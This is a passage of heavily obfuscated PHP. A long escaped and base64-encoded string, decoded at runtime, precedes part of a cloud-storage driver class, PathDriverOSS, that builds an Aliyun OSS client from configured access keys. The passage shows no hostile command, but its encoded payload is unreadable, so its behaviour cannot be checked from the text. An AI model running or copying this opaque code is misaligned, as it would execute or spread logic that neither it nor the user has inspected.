2\302\103\14\151\23\363\56\176\341\261\41\253\311\26\224\222\267\350\143\345\31\47\123\47\20\257\337\220\335\67\4\204\13\121\216\313\113\70"."\300\261\145\61\334\163\143\76\270\137\225\372\322\305\313\147\270\257\150\12\15\11\314\44\201\6\311\352\123\32\105\47\72\120\117\115\153\134\302\1\51\265\223\71\65\2\7\246\121"."\163\200\23\16\304\36\202\73\53\27\361\210\304\241\156\100\307\146\105\324\310\3\33\201\361\212\324\77\331\27\127\352\226\174\270\116\262\336\253\326\153\201\202\374\203\26\221\345\174"."\361\7\23\272\330\222\121\65\142\305\365\205\225\4\375\43\137\42\225\44\232\351\251\103\320\221\132\234\300\314\347\40\133\340\30\42\324\261\270\332\201\366\202\70\343\30\14\73\345"."\xa2\xbd\xac\x16\x90\x2\x7\x31\x34\x99\x20\x31\x90\x85\xf3\xd8\x2\x72\x2f\x4f\x6f\x7\x61\xb2\xd7\x21\xb2\xca\x43\x4c\x1f\x2\x7c\x64\x89\x9d\x3a\x44\x7f\x56\x15\xb2\x7e\xd4\x71\xc0\xba\xac\xee"."\160\337\104\230\232\61\143\102\334\147\311\242\270\300\251\337\250\344\226\122\33\321\261\321\26\223\166\124\250\245\300\120\52\7\7\135\304\267\122\311\170\167\202\135\235\340\70\26\31"."\xa9\x89\x70\xcb\x2a\x7e\x8b\xc1\x53\xdb\x42\xcb\xbd\x29\x11\x2c\xf2\xb\xb5\x57\x4d\xe6\x82\x28\x9c\x4e\x4e\x7c\x6a\x22\x8e\x25\x76\xe1\x68\x9b\xa7\x42\xb2\x83\x7b\x11\x75\xa7\xa9\xd1\x48\x6c\x69".base64_decode('1QzEN3RKVWhiJBXu9Ka5W0iGQwnmfhbHm6PxFik7Eq+EBGdMeCKV99HE4Jq63nXkyA==')."\322\210\116\56\331\365\130\60\340\127\373\246\325\57\356\335\120\137\327\33\134\34\230\312\345\131\224\134\111\46\253\223\44\333\154\23\151\364\46\340\375\207\45\322\152\20\13\6\2"."\360\21\36\10\366\6\231\3\254\40\317\344\205\74\73\7\370\174\116\122\37\102\256\356\171\234\153\60\253\365\200\327\235\251\212\255\143\125\276\320\360\35\250\232\134\225\344\123\102"."\361\263\132\276\13\11\151\61\131\343\300\123\30\375\355\222\213\142\45\227\252\5\135\130\354\262\16\226\223\2\206\51\26\210\130\311\131\63\123\306\56\213\304\264\10\133\142\224\24"."\160\65\201\150\370\220\70\166\303\102\114\262\5\133\104\333\43\354\277\55\210\213\154\357\210\234\270\64\332\31\213\167\55\113\44\123\335\313\127\254\134\5\176\33\33\31\236\364\53"."\x7e\xe6\x71\xc\x5c\x90\x6\x47\x34\x2b\x38\xc2\x9c\x7d\x2f\xc7\x87\x0\xdd\xe\xca\xcc\x15\x4f\x44\x63\x44\x34\x90\x51\xb0\x20\x95\xd\xf0\x5c\x4c\x30\x82\xd5\xb3\x68\x6b\xc1\x42\xd1\x99\x3e\x49"."\211\56\113\117\233\246\63\111\356\362\316\317\157\30\62\173\172\355\76\216\230\131\175\4\202\102\253\314\26\107\37\340\53\374\262\323\161\214\252\62\253\227\115\173\30\0\110\20\236".base64_decode('ZyU2QSQSw0vhgbcIrNA4uwYh7r5aTP4ZcLbZjp1tMkebw8QFpNd/5LBfG3LlC4++ww==')."\176\164\104\164\305\75\76\44\261\256\1\167\353\213\43\66\217\311\113\202\154\25\134\131\6\157\110\35\236\325\310\23\271\373\341\44\121\43\154\124\146\201\217\356\66\304\32\113\226"."\224\314\113\262\140\235\60\273\105\334\122\323\250\117\21\336\375\231\274\223\36\42\216\365\54\20\342\112\106\360\323\31\331\333\0\243\260\205\41\241\226\125\30\342\352\24\31\27\207"."\201\67\363\66\111\173\113\60\21\340\150\37\345\65\217\63\25\50\260\306\154\36\117\110\357\204\270\74\75\310\117\23\150\245\122\113\16\217\301\265\152\135\111\31\71\322\217\225\100"."\x64\xe5\x11\x10\xe5\x51\xdd\xd1\x0\xca\x6e\xa5\x9c\x5c\x96\x97\xb7\x45\x88\xcf\x62\xbf\x34\xbf\xae\xe6\xb2\x8c\x6a\xdb\x6c\x71\xe4\x35\xdb\x59\xee\x72\x7d\xf3\x85\x8e\x86\xb1\x8b\x87\x4e\xce\xad"."\x72\x46\x29\x68\xda\x76\x10\xbb\xeb\x23\xec\x21\x57\x8e\x8a\x27\xd9\x25\x85\x7b\x2c\xf4\x15\x16\xe9\x34\x9\x1e\xc3\xb8\xbf\x5c\xee\x4d\x57\xb8\xdc\xa5\xb2\x65\x1a\xe\x73\x37\x26\x88\xcb\xd\xd".strrev('có×.ù€a÷}–9™"ä˜Î˜b¼1´#–Õ7$}ÄêÎp{.¶™+3½‘fÏ`').base64_decode('fjR0j5NhW9eHmGabxPHyU20Xdx7sHQ5GWbF4Le4uml5L+qsm+CWXBxRrJSfpqF/QNA==')."\356\46\234\174\163\4\66\354\110\114\177\126\127\33\265\337\22\336\234\321\134\322\247\15\226\352\343\314\123\262\207\266\170\234\53\367\266\367\166\366\246\144\60\71\226\326\337\217\272"."\x2d\x79\xf3\x74\xf5\x45\xf8\x72\x6\xf4\x23\xaf\x11\x30\x60\x4c\xee\x9\x1a\xa4\xef\x27\x54\x75\x24\xd\x99\x84\xc5\xd\xa2\x12\xd8\xd4\x7d\x94\xb3\x11\x41\xf2\xac\x49\x15\xdc\x5d\x86\xd3\x1\x7b"."\373\205\262\145\251\54\275\254\43\343\13\336\36\370\153\50\370\150\114\375\157\63\152\117\374\142\303\373\0\115\154\104\10\164\305\146\63\13\73\351\272\32\204\211\65\215\65\307\327".strrev('ŸÚğ4	‹÷JĞ#sH/•ÅKKâ¨ÉÁê¾<i¨ı N"ÏH€f'."\r".'_úß¡')."\234\21\34\5\172\260\170\30\177\121\74\362\341\165\41\75\246\152\205\11\46\177\127\145\67\311\340\200\31\240\56\347\164\360\236\60\7\312\235\255\320\374\112\177\250\163\265\137\270"."\x12\x5e\xb8\x78\xac\x90\x57\xe0\x58\xd3\x54\x3b\x3d\xd0\x50\xab\xb0\x47\x60\x9a\x6a\xbb\x53\x6d\xfe\x79\xb5\x8b\x17\x1d\xb8\xb0\x85\xdc\x5a\x3a\x7a\x27\xbe\x76\xc4\x87\x6e\x7a\xda\x5c\x4\xb7\xa"."\xb\xf1\xf2\xe2\x91\xa0\x3b\x36\x59\x5d\xc0\xbf\x82\x36\x61\x16\xb5\x51\x1b\x51\xa8\x42\x80\x99\x80\x74\x73\x2a\x26\xdc\x78\x17\x75\x67\xd4\xb4\xe0\x4a\x16\x78\xb5\x19\xd\xb3\x64\x9c\x6\x14\xb1"."\331\322\46\22\216\106\54\210\143\303\357\56\215\227\213\176\174\346\365\47\145\67\163\236\227\15\32\334\345\361\251\325\135\136\46\215\31\101\76\12\42\110\137\251\150\124\344\247\113"."\44\337\271\104\42\102\127\45\323\56\200\64\114\65\131\222\240\240\375\102\345\33\223\104\325\115\22\227\170\372\213\101\355\107\314\1\306\177\264\250\34\103\162\174\55\27\161\277\217"."\xe1\x7d\x35\xc3\xb\x5\x52\x5\x4f\xae\x5f\x7e\x8e\x63\xc\x71\x72\x38\x1b\x3b\xbc\xf7\xe3\xf9\xf5\x1b\xd9\xc9\x72\xc4\xa2\xae\xda\xd5\xc\xa0\x4a\xb5\x22\xdd\x65\x23\xeb\xfd\x24\xb9\x5\xf7\x97".strrev('._‰vG?ô|öq³1™W‹G’úU®oÙî½ıŸ¸ã§ı“ÛÂ"€VLù•UƒìË')."\61\255\133\24\144\276\346\217\15\366\63\72\40\36\314\140\143\303\23\56\171\345\167\45\13\60\362\25\316\10\210\253\234\350\255\353\51\26\30\50\75\27\112\257\7\20\121\55\135"."\111\130\265\105\345\157\54\124\241\244\131\146\345\144\60\56\133\172\26\202\117\310\0\13\130\274\274\46\226\110\72\77\44\106\222\306\12\306\200\341\103\250\243\246\140\257\310\226\53"."\xcb\x41\x73\xe5\xe2\x50\x93\x94\xa9\x38\xa6\xa9\x14\xb4\xe2\x38\x70\xad\x53\xec\xc6\x29\xf6\x2\xfc\xa1\x26\xac\x5a\x6d\xa3\x8\xd0\x6b\xee\x79\x15\xef\x23\xc2\x4f\x1e\xf5\xf2\x2\x39\x54\x30\x1d".base64_decode('wE+4BPAmlShLL1e5bQBUtDd5bkfl5+668mX+2kWJhGFIXdHu9khMUtmREtSW1pga6g==').base64_decode('6qqawTkcLMLC990BZjyKH/gCkmsUBpQMVuhvqsGpNYptZZjD2pogEF5SQBwMFhpQpQ==').strrev('(£¹p›jIèït`\'Šb•ˆ!1ğãÁì)–<\'ìø‹-k³D$ü˜ÑúQW')."\65\205\2\276\251\226\110\152\153\225\34\332\300\271\106\340\42\157\345\30\273\50\131\30\324\344\114\274\24\23\46\343\227\371\351\140\204\273\233\253\52\154\17\111\356\255\311\73\26"."\x2d\x5a\x71\x79\x65\x15\xdc\x78\x20\x23\x67\xd1\x99\x24\x16\x15\x95\xe5\x83\xe4\x48\x1a\x14\x7\x21\xf7\x6d\x4\x17\xde\x57\x41\x8a\x92\x96\x19\xc2\x88\x27\x76\x9\xf8\x12\x64\x74\xe1\x93\xb\xcd"."\160\71\353\167\44\125\204\62\266\51\42\302\137\113\274\155\263\156\35\155\10\63\6\33\66\124\246\201\66\243\67\53\124\62\274\111\30\137\274\151\370\4\51\322\320\166\347\376\14"."\xc5\x55\xb9\x90\x48\x61\x65\xe8\xaf\xa8\x13\x8d\xb5\x8b\x8\x5d\x50\xae\xcc\x1e\xa6\x38\x4c\x62\xbd\x3d\xb5\x81\xa9\x1b\x36\x4\xd\xa6\xf3\xc3\xf4\x13\x58\xdd\x0\x2f\x4d\xe3\xbd\x1\x77\x79\x34"."\x12\x0\x3d\x2f\x8\x9\xde\x92\x94\xcd\x3c\x11\x96\xdc\x81\xc1\xa9\xc2\xe\x8a\xeb\xf6\x28\x58\xe1\xa7\xa9\x69\x51\xf\xbf\xda\xe8\x63\x79\x8c\x57\x34\xa6\xcf\x63\x93\x3e\x91\xf3\xa7\x56\xf0\x60".base64_decode('S0xwwxy1KRUJkNN/yO3QdvEIfw2FQlUOh0olORpkESz3zhvpIF/jVBYeyAjzIVaEUA==')."\30\117\72\126\314\361\144\340\227\205\110\362\10\242\231\210\71\33\364\246\243\266\170\42\17\54\264\63\226\121\162\134\324\211\76\324\130\103\136\253\31\324\106\64\132\244\106\201\143"."\173\123\15\361\345\136\203\250\21\315\1\62\40\272\262\20\223\35\305\322\363\115\65\244\273\166\116\327\121\175\102\130\252\175\4\125\254\121\30\115\54\150\34\142\226\143\242\375\221"."\x9b\xa7\xc0\x1b\x57\xdd\x9\x50\xf9\xf\xc5\xe0\xae\xe1\xb8\x35\xf4\xf7\xf8\xe3\x38\xf9\xc7\x2f\xad\xe5\x75\x8b\x2a\x34\x13\x22\x43\x6e\xb9\xfa\x85\x6c\x6\xde\xda\xea\x4a\xc4\x53\xf1\x16\xf6\xe4".strrev('ŠF€ö1ã&\'¨d«'."\r".'mòBÌ*r,\\«w˜„Ç8%g÷¿'."\n".'Y˜ƒœJäÔÚßÆ,Î!5O')."\243\15\176\365\51\240\364\150\354\126\4\164\57\351\65\117\62\127\166\304\26\212\275\302\247\260\275\251\15\311\222\237\74\354\245\17\65\324\103\255\136\233\32\230\365\1\323\314\22"."\xb6\x47\x50\xb2\x4a\x1b\x54\xfe\x98\xe2\x9a\x4f\x7a\xd1\x25\x22\xa1\xdf\xce\x9b\xcc\x75\xe0\x8c\x86\x86\x6\x7f\xc3\x74\xf4\x3f\xd3\xdd\x65\xe\xcb\x1a\xb9\x1d\xb5\x28\xd2\xd0\xd0\x48\xfe\xa7\x19".base64_decode('RCwIk+LOQYufUS0oMKoz7wewERSMYplxXT0t2MJIwV3rY4wG6z+aD+LRjxGQBdJZcQ==')."\201\102\256\277\40\246\173\201\300\357\25\141\206\145\167\317\54\214\230\37\64\333\4\50\320\137\156\260\206\212\11\74\132\100\355\3\233\170\247\302\305\154\217\374\261\0\3\56\115"."\24\56\212\375\54\303\57\77\51\0\225\350\326\40\344\347\256\256\241\72\156\127\201\70\5\155\314\31\76\116\234\40\211\124\60\47\47\271\77\304\121\131\114\116\262\271\325\27\211".base64_decode('5bkxOo7GeEv05Qr6oBnAsAq65sxRVezCOHoijxGQ4jMVQ8OsZJmH4crosVSci6HE5Q==')."\67\334\345\23\13\355\41\43\357\262\113\125\245\252\62\154\27\340\202\154\44\51\167\115\334\20\132\321\41\376\176\7\325\255\143\175\123\140\351\1\373\200\167\20\362\10\40\125\207"."\x6c\x3c\xb0\x62\x72\x1d\xef\xc4\x92\x39\xb2\x4c\x61\x64\x5a\xa1\xd1\xc2\x62\xd2\x4c\x31\xd1\x6f\xf2\xb\x94\x4e\x58\x4a\x98\x25\x50\x7d\x8d\x16\xee\x27\x50\x6a\xc0\x9b\xe5\xa9\x13\xa2\x12\xe3\x8a"."\12\220\136\131\232\110\331\253\224\306\351\236\322\304\103\140\13\167\174\52\273\15\244\167\331\222\376\204\15\216\333\305\345\65\153\143\104\72\156\5\112\226\71\200\146\335\226\201\206"."\322\273\252\47\363\342\225\45\253\24\342\275\227\313\311\211\130\204\317\236\342\4\164\26\206\256\232\170\11\130\52\52\136\35\224\22\335\253\131\312\150\341\317\354\310\211\370\370\46"."\xab\x2b\x10\x25\x53\x77\x1b\xf8\x98\xe5\x4e\xe1\x3d\xfb\x1c\xa4\x63\xe7\x79\x7\x9e\x6d\x95\x55\xec\x68\x31\x41\x91\xb0\xac\x45\x96\x8\xab\x2e\x34\x61\xb8\xca\xb4\x23\x30\x84\xc4\xa5\xa4\x3b\x9d"."\xa6\xd1\x13\xb7\xeb\x5e\x24\x45\x8\x5d\x5e\x67\xaf\xc8\x2\x29\x24\x8b\xa\x37\x40\xb4\x48\x3c\x40\x15\xb\x1\x96\x6e\x53\x93\x5c\xcd\x9d\xf7\xd2\xf\xce\x67\x81\xb\x58\x29\xc\x56\x2e\x30\x94"."\45\351\30\244\252\54\14\301\53\272\203\77\136\132\5\21\335\310\126\201\125\204\77\300\15\64\162\122\50\305\160\353\100\310\174\350\220\147\123\271\235\17\47\53\364\105\117\245\250".strrev('q¸±éO^ó'."\n".'l{@3S)hi–t‡µ÷‘]KQ!íÕ·	\\¨éØSñ±àÊ¤÷bós')."\14\302\260\173\320\260\372\20\123\57\166\23\230\220\36\112\215\131\233\270\313\20\312\262\371\31\56\353\214\123\127\334\33\255\264\155\50\122\233\100\305\123\71\313\164\370\241\16\347"."\x23\xb4\x14\x91\xa8\xcc\xbd\xa5\x68\x15\xff\x22\xf1\x59\xd7\xfd\x98\xe4\xc8\x99\x17\x45\xdb\x3c\xfb\xba\xc6\x7a\x44\xb4\x9e\x88\x23\x6c\xe9\x9c\xe9\x89\x7a\x75\xc4\xc8\x36\xed\xb0\x9d\x96\x79\xc6".base64_decode('FupTeFaTklJNlS9AJV4F+AdLz5gWETNITgmKTkIfkKNRk4tX8D2XXqUJ7AdGWvV4EQ==').base64_decode('oIN/WfYqIznQRjHJU7rEB/qnK5yBVGnLNDJNyiDlq/GSHqmgZLJA5BrJcppfzng4PA==').base64_decode('ZgWhyAwUM2vADRAHH3gEtpyHmsWObMXI5CrkmxVVaB7mYYSbDDnHxi7Qu9m0Vcup8g==')."\51\222\45\101\64\303\35\7\1\164\4\220\40\143\134\147\172\204\376\351\63\374\314\105\226\154\42\301\16\21\100\306\321\132\220\320\0\237\267\30\25\1\55\74\50\47\312\230\322"."\25\27\161\235\41\34\6\20\57\41\174\76\211\73\21\36\263\244\255\134\347\32\172\304\257\206\114\125\305\215\71\125\334\303\5\272\253\345\123\10\341\354\126\227\252\245\247\0\132"."\31\356\174\360\205\56\72\103\135\173\230\56\75\30\117\43\340\161\137\366\366\116\152\211\161\10\175\123\224\144\122\217\353\22\140\304\315\77\365\70\302\24\147\71\135\22\311\51\223".strrev('¼IæÕr=Õ®Úr9rÂ9m,Éğqu‡ânqÎ­b]GWYB<(ñ©&„¬`jV\'')."\324\250\316\354\100\231\370\245\253\243\53\310\223\232\371\362\244\47\167\341\350\250\205\51\370\350\143\314\203\334\150\301\310\50\321\170\173\244\45\24\155\215\44\227\52\3\272\243\10"."\65\7\362\142\202\173\51\23\31\43\5\74\303\352\64\167\336\217\203\376\64\142\330\375\131\176\250\261\305\361\105\322\300\222\336\75\162\67\113\361\117\267\52\132\54\142\363\216\174"."\x45\x1d\x2c\x39\xad\x52\x3a\x2f\x44\x8a\x52\xe1\x92\xa5\x57\x96\x1f\xd7\xb1\xaa\x8d\xd4\x63\xa9\x42\xb9\x4a\x6f\xa0\x7c\xf5\x2f\x90\x17\x16\xe4\xd2\x88\xf\xd1\x8b\x93\x75\xde\x28\x8e\x18\xb6\x21".base64_decode('Fj6rMS63HmrtjMTUUDQaX+HSVBMyY4u/Z5GVn7+QZkZMAv16pf8t8F4kexr3SDHo9A==')."\311\256\330\112\354\312\4\136\360\343\336\360\151\124\172\235\246\144\151\206\255\113\11\364\125\225\251\140\115\241\345\363\256\167\351\362\375\122\264\354\336\131\253\176\112\245\37\140\151".base64_decode('ktu3agUSkfaO1P+4q0ZWuFwyskxzgxu/UUf5LfIbhuybFS/wfOFbPj5xZ6MSpzTsSQ==')."\x31\x93\x9c\x46\x80\x55\xa6\x69\x91\xb8\x4a\x9f\x3c\x17\x9f\x40\xe7\x64\x6b\xbc\x24\xdf\xf2\x5\xb3\x41\xe\x62\x1a\xc0\x9e\xe5\xc2\xec\x6a\x9\x47\xc4\xb9\x0\x17\x87\xd6\xf0\xe7\xe8\x69\x11\x1d".base64_decode('grHMi50gmOYhohMAZ9ctt+dVIq+SputB+opvEJf4NK8HDweV7BODQzH+5IWo6s2p0g==')."\x1\x94\xad\x8\x91\x12\x2f\xa0\x34\x29\xd\xf4\x81\x2c\xfe\x9c\x81\xb2\x90\x99\xf2\x8a\xf\x10\x5f\x50\xe1\x42\xc9\x71\x9d\xa4\x3b\x64\x35\x6d\x69\x6e\x68\x2\xe1\x74\xc4\x49\x9\xeb\x1f\x99\x85".strrev('¹ş”™šEIÿú´8›åNë®Ä>ìGs>çXÈ!†S~ÅcğëÅúÊ)—Šñ')."\xa9\xec\x90\xed\xdd\xea\x4\xdb\x85\x9f\xfb\xc9\x99\xa3\xee\xb7\xee\x70\x8a\xf7\x81\x1f\xd7\xd3\x3e\xd2\xa2\x21\x16\xa7\xf2\x63\x44\xee\x4a\xbe\x8a\x47\x35\x14\xf2\x88\xa9\x82\x50\x1d\x66\x11\xbb"."\x29\x62\x47\x42\x52\x58\xfa\xf4\x14\xfa\xd3\xb\xbf\x6c\x3b\xf3\x76\x82\x12\x2a\xf8\x64\x3d\x47\xaa\x96\x9c\x91\xcf\x5a\x5c\xa1\x46\x24\x74\xea\xe2\x9c\x4e\x6a\x61\x9d\x12\x8d\x3d\xd6\x4a\x5e\xfe"."\152\145\64\31\336\361\250\366\352\23\366\353\346\176\216\104\274\362\42\366\116\367\253\27\374\132\330\26\213\301\166\134\357\254\244\314\224\66\340\243\34\31\246\152\42\326\74\56\207"."\x65\x65\x4f\x32\xa\x94\xc9\x64\x69\x59\x3e\xdf\x8b\xa4\x2\xec\xe9\xb4\xac\x8f\x3c\xf2\x45\x49\x9d\xf7\xa1\x10\x69\xa5\x71\xfa\x29\xd7\x1e\xc8\x9b\x69\x2d\x9f\xa0\x7a\x68\x2e\xb\xd\xb\x9d\xa6"."\370\213\364\256\142\64\51\250\225\112\342\76\112\336\62\321\277\56\313\70\310\353\116\165\250\304\276\133\245\327\326\111\201\163\322\115\26\115\204\133\255\162\61\102\57\1\134\251\226".strrev('ƒ|€ï[‡‡Ÿ‘EØkÒò°w¨ô›t‰r¢]’nL'."\0".'…è»?QÅ‹a;ûÒe]“Ît').base64_decode('AspCRaCGayFjVELcMH1GjVAKmXH/nFTpERt4rq3amzQU88lPq97PDzU4LjZ32UeFUA==')."\321\360\276\244\126\371\52\34\173\1\216\55\35\170\376\255\312\233\156\223\76\11\347\23\146\167\237\367\324\215\60\16\163\277\1\214\307\301\131\3\176\156\250\70\172\170\117\35\34"."\254\236\12\11\57\220\123\146\245\170\126\134\113\273\36\254\223\106\15\244\255\362\321\73\11\14\322\270\313\126\336\107\156\350\175\314\307\133\325\167\363\134\17\357\170\47\264\312\313"."\173\137\330\40\250\377\222\103\127\326\115\365\32\27\246\55\166\345\351\55\146\270\160\127\265\164\141\73\102\135\142\126\154\20\253\12\331\31\63\147\317\227\205\33\142\12\305\375\40"."\130\306\303\175\46\160\53\2\51\24\67\32\52\314\17\247\274\372\111\246\133\43\273\362\135\106\317\16\360\77\133\60\342\364\100\213\112\172\322\225\357\333\126\100\200\340\251\244\101"."\44\155\210\36\355\17\23\253\147\330\142\325\321\55\120\74\315\350\376\26\145\37\252\214\103\332\367\304\142\241\117\353\231\171\174\306\56\140\321\271\143\151\356\3\145\265\163\23\201".base64_decode('BDukGeTNat3bdwIYkKaIbOlgJbfomF5REK6O90UiiYwX87BtY0NjsdokSvQ/mEB2Rg==').base64_decode('oscpoftTZeTBJYy0VHk6UVKl+Jx+U+6Onwf9muOXEFISH+pOnEwwkAhxbHWP1dM8qg==').strrev('3en®Jék«–@¼ğ™'."\r".'ˆß÷ä“fæüb~§$áõ™µÃ¹‰*+…¤ñdª“)óèÚ&')."\x2c\xd2\x90\xbc\x26\x2a\x9b\x96\x5e\xd3\x13\x52\x21\x22\x46\x82\x11\xc1\x82\x26\xee\x36\x49\x37\x43\xed\xdc\x6e\x4f\x93\x94\xb7\xdc\xa2\x2a\xc\x6a\xe9\xa5\x54\x53\xe\x8b\x29\xc0\x64\x3f\xce\x1c"."\210\242\257\273\216\232\50\336\352\171\70\227\220\50\357\153\272\14\104\204\56\10\222\47\231\177\272\316\65\374\175\61\327\71\307\366\76\52\210\270\75\331\11\60\212\172\37\145\5"."\xda\x48\xd4\xea\xe9\xd7\xa4\xdd\x55\x6c\xa4\x22\x14\x2b\x17\x44\x44\x92\xef\x92\x23\x15\xcf\x74\x59\xc9\x62\xff\x4a\x1e\x32\xc0\x6c\x6f\x6d\xcf\x63\xa3\xd4\x3d\x2b\xd\x33\xce\xff\xff\xfa\x3d\xbd".base64_decode('/1fP6M1uYJJ411u87cB/M5ZvQnIBTaXAnnG4d9ADAIv4S9NSnOsOMx9bzPWWxi6jtA==').strrev('îò±pübM1àªŒˆdªûLÇ“¯aí<_y’Úñ¬ÆÄ7ÈE9^*XŸ«gÚ^|')."\30\317\127\324\355\100\131\342\70\52\212\211\257\42\306\204\271\53\13\262\120\6\237\1\211\17\1\200\227\154\364\31\57\261\323\142\75\220\371\276\45\214\34\21\333\162\240\112\62"."\x25\x72\x25\x55\xd0\xaf\x94\x6b\x16\x5c\x89\x32\x80\x61\xd6\xb0\xcd\xac\xfb\xed\x78\xa8\xd1\xe9\x79\xb1\x91\x16\xb2\x65\x68\xba\xe4\xf5\x95\xaa\x4\x95\xb5\xf9\xca\x97\xab\x60\x25\x6d\xb7\x8\x8b"."\xbf\xbb\xdd\xe0\x7d\x88\x7b\xba\xbf\xf2\x63\xd4\x46\x2\x4b\x51\x12\x58\x6e\xc1\x24\x51\xe4\x4a\x87\x5c\xad\x56\xa9\x43\x31\x35\x29\xca\x4c\xb2\x56\xaa\xaf\x58\xfe\x52\xa6\x10\xcb\xe1\x90\x3c\x5e".base64_decode('tvK7LJNwd+5ULsuRFF+lp6OnBCr2F0btXCBHBzdxZ2iYxIs6q9rdWUfMfQBj0VmizQ==')."\24\163\57\75\322\214\327\224\160\215\210\35\131\21\361\241\274\205\63\13\74\111\201\35\222\134\102\76\133\176\260\302\135\23\233\44\270\327\322\242\152\305\62\246\145\113\305\170\172".base64_decode('tbIYw2QhhpyHn9F1XHMhHOJ7HeGToz09rbsO7XCtKydJt56I8866X9YgmSSZedGEFg==').base64_decode('pHs797Upd/9dQSnLRlTKJrWYczb0i60UI8L3AsmmNxIh6a1mby33s97SJWuGYF648g==')."\x1e\x4d\x5c\xef\x49\x7c\x6\xab\x86\x8f\x45\x62\xb\xf0\xa4\x57\x7b\xa5\xba\x5f\x1b\x11\x4c\x92\x60\xcc\xb3\x59\xfe\x40\xbc\xab\x68\x56\xf7\xba\x99\x41\x29\xe2\x2d\x79\xcc\x64\x49\x6\xba\x42\x3d"."\136\37\365\76\326\33\220\215\172\135\5\53\123\205\1\257\124\137\334\250\210\141\342\264\152\303\47\13\315\135\135\66\20\346\110\45\222\350\333\10\134\43\113\72\4\141\273\20\241"."\xaa\x45\x87\xc2\xcf\xfa\xe2\x93\x6e\x73\x64\x5e\x8c\xcf\x19\x2a\x43\xac\x70\xfc\xae\x54\xcf\xb1\xe\x8b\x55\x18\xc7\xe0\xc9\xb2\xe5\x87\x76\xdd\x77\xa7\xb2\xf0\x41\x42\x1\x3d\x1f\x95\x9a\x93\xef"."\x55\x27\xad\x90\xac\xfe\x11\x81\x95\x6e\x10\x4b\x76\xdc\x22\x83\x6d\x75\xa6\xb\xf8\x12\x89\xe4\x3\x83\x92\x9\x39\xd3\xd5\x1d\xef\xd4\x92\x13\x89\x40\x5f\x9a\x58\x20\x32\x5d\x9a\x17\x72\x67\xd1"."\362\272\247\367\162\5\357\310\150\15\173\324\160\62\71\351\230\124\231\131\231\156\125\0\25\76\124\275\277\336\136\61\230\172\17\217\242\221\212\376\110\312\31\51\263\112\35\332\243"."\xaa\xd5\x68\x16\xae\x29\xd8\x55\x57\xdd\x49\x40\x80\xeb\xd2\x2c\x5c\xb7\x22\x9b\x55\x96\x64\x2d\x52\x3d\x47\x2b\xdb\x93\xc\xaf\x12\x78\x20\x80\xc8\x56\x19\xb0\xe7\x98\x4e\x8b\x4e\x6\xcf\xaa\x85"."\x2b\x3f\x7\x18\xe7\x2d\x4d\x24\x16\xd5\x7b\x21\x4\xd\x9e\x4b\xf2\x6a\xbd\xa8\x5a\x78\xd2\x5e\x88\xd2\x9e\x5d\xa0\x1a\xad\x65\x39\x55\xa8\xab\xd0\x96\xa8\xa4\xe3\x22\xaf\x8a\xee\x6\x6d\x13\xef"._kodDe('LqLBlmPJGhKiZTiBRcU0X5VlqywoItmwUBenR2BdcJTYJ4h0dgtKQMPSj9+S0tXBQNQ=').base64_decode('e0ZWaCBi7emQ5QVkRWtuPC2WJXepVRXmffhcX3mCzmvsGkCyNKBHHtMxMrrbJ6vsow==').base64_decode('ieazj+QlQaFHRiekDC4dgypSLJIEfJ0Ql9P2JI5F4ITLwoPyCXDLQC8oW/BFOL+aIg==')."\xfe\x44\xe9\xbe\x4a\xb3\x93\xa6\xe5\xf8\x70\x5e\xca\x2c\x91\xdf\x66\xd3\x71\xc4\x85\x3d\x3d\xd6\x13\x66\x10\x6f\x8e\x3e\x49\x1f\x5\x85\xc4\x3d\x14\xee\x14\xb9\xe0\x20\x68\x4b\xc8\xb\x9\xc2\x55"."\x29\x3e\x2f\x27\x75\x9a\x4b\x88\x92\x2b\x82\x2f\x4e\x78\x44\xde\xfb\xe0\xca\xb4\xad\xec\xb9\xd4\x15\x9\xe8\x70\x9a\x36\xc7\x98\xb7\x46\x6c\x59\x2e\xfa\x23\xae\x56\x8\xc8\x4\x7f\x2\xe8\x27\x6b".strrev(']Y’¦IÅ0.²&øº‚hª‘'."\0".'Zóôñ\\G«éÕ\\–'."\n".'ëŞFa¯ßåà‚sH;}›Ô')."\xa1\x64\x72\x45\x3c\xd1\x4a\x3d\x82\x57\x64\x93\x5a\x92\x86\x52\x45\x56\x57\x47\x3c\x36\x59\x5e\xb8\x33\x14\x89\x56\xe4\x61\x65\xa6\x98\x2a\xdc\x6a\xd1\xac\x48\x17\xe9\x25\xb9\x11\x9c\xac\x17\x91"."\x96\xa5\xa2\x27\xe4\xee\x59\x48\xea\x4b\x39\x93\x9\xe0\xd9\x4d\x46\x52\xcb\xb3\x53\xba\x64\x57\xaa\x17\x84\x3f\x35\x51\xa7\x68\x64\x86\x84\x70\x4f\x93\x98\x77\x9b\x39\x3e\xe4\x1\xf7\xf3\x3a\x1e"."\x9d\x41\x86\xa4\xd0\x10\x56\x44\x8a\x41\xdb\x89\x12\xa4\x62\xf\xe9\x7c\xad\x73\x46\x5a\x5c\xa6\x7\x5c\x97\xee\x52\x3a\x59\xf\x84\xc0\x48\x38\x27\x6f\xb4\x24\x61\x6a\x55\x0\xc9\x52\xde\xca\x5b"."\7\222\53\0\200\73\166\242\11\132\154\203\146\132\272\125\240\307\30\260\362\4\220\112\312\146\64\354\312\166\264\201\252\167\317\124\232\207\127\274\220\263\375\157\41\165\24\300\130".base64_decode('rAAA').""."".""."".""."", 10, -8))); goto DÓ¿í…™‹Ï; eòµ’Õ÷Ô : class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($œ¦‹Û™Š) { parent::__construct(); include_once SDK_DIR . $_SERVER[”ú…±Ú¥][1397]; $this->_init($œ¦‹Û™Š); } public function _init($»ÙÎêŸ) { $ìñ¼“×Ë =& $_SERVER[”ú…±Ú¥]; $this->config = $»ÙÎêŸ; foreach ($»ÙÎêŸ as $§ƒ×Ôéø => $äÈ»È¸) { if (isset($this->{$§ƒ×Ôéø})) { $this->{$§ƒ×Ôéø} = $äÈ»È¸; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ìñ¼“×Ë[1398] . LNG($ìñ¼“×Ë[1399])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $îÙ’»Í« =& $_SERVER[”ú…±Ú¥]; $°Å÷İ¥ = new OSS\Model\CorsConfig(); $Á²ÃÕÖ¾ = new 